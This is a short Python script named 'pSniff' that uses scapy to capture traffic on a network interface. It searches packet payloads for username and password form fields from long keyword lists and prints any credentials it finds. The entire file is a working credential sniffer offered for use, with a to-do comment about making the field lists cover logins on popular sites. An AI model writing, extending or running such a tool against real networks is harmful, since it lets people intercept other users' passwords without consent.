from scapy.all import *
from urllib import parse
import re
import termcolor
import pyfiglet

banner = pyfiglet.figlet_format("pSniff", font = "alligator")
termcolor.cprint('\n'+banner+'\n\n','red')

iface = "eno2"

termcolor.cprint(f'\n[*] Sniffing for credentials on interface: {iface}\n','red')

def getLoginPass(pktBody):
    user = None
    passwd = None
    
    #To-Do: make these search parameters more comprehensive by manually capturing login attempts on popular sites
    userFields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                  'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                  'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                  'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario', '_user']
    passwdFields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
                  'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword',
                  'login_password'
                  'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha', 'contrasena']

    # Iterate through userFields
    for login in userFields:
        '''
        Creating loginRegEx object calling regex library search function to search for specified pattern
        2nd paramter is where we are searching for the usernames....in the body of the packet
        3rd parameter is to ignore the case of the characters
        '''
        loginRegEx = re.search('(%s=[^&]+)' % login, pktBody, re.IGNORECASE)
        # Check if loginRegEx is empty, if not we have found usernames
        if loginRegEx:
            # Store result in user variable
            user = loginRegEx.group()

    for passwdField in passwdFields:
        '''
        Doing the exact same thing but with passwdFields
        '''
        passwdRegEx = re.search('(%s=[^&]+)' % passwdField, pktBody, re.IGNORECASE)
        if passwdRegEx:
            passwd=passwdRegEx.group()

    if user and passwd:
        return(user,passwd)

def pktParser(packet):
    # Check if packet satisfies these 3 conditions, if so it is what we are looking for
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        # Extract body of the packet
        pktBody = str(packet[TCP].payload)
        userPass = getLoginPass(pktBody)
        if userPass != None:
            print(parse.unquote(userPass[0]))
            print(parse.unquote(userPass[1]))
    else:
        pass

try:
    sniff(iface=iface, prn=pktParser, store=0)

except KeyboardInterrupt:
    print('Nuking pSniff, goodbye!')
    exit(0)


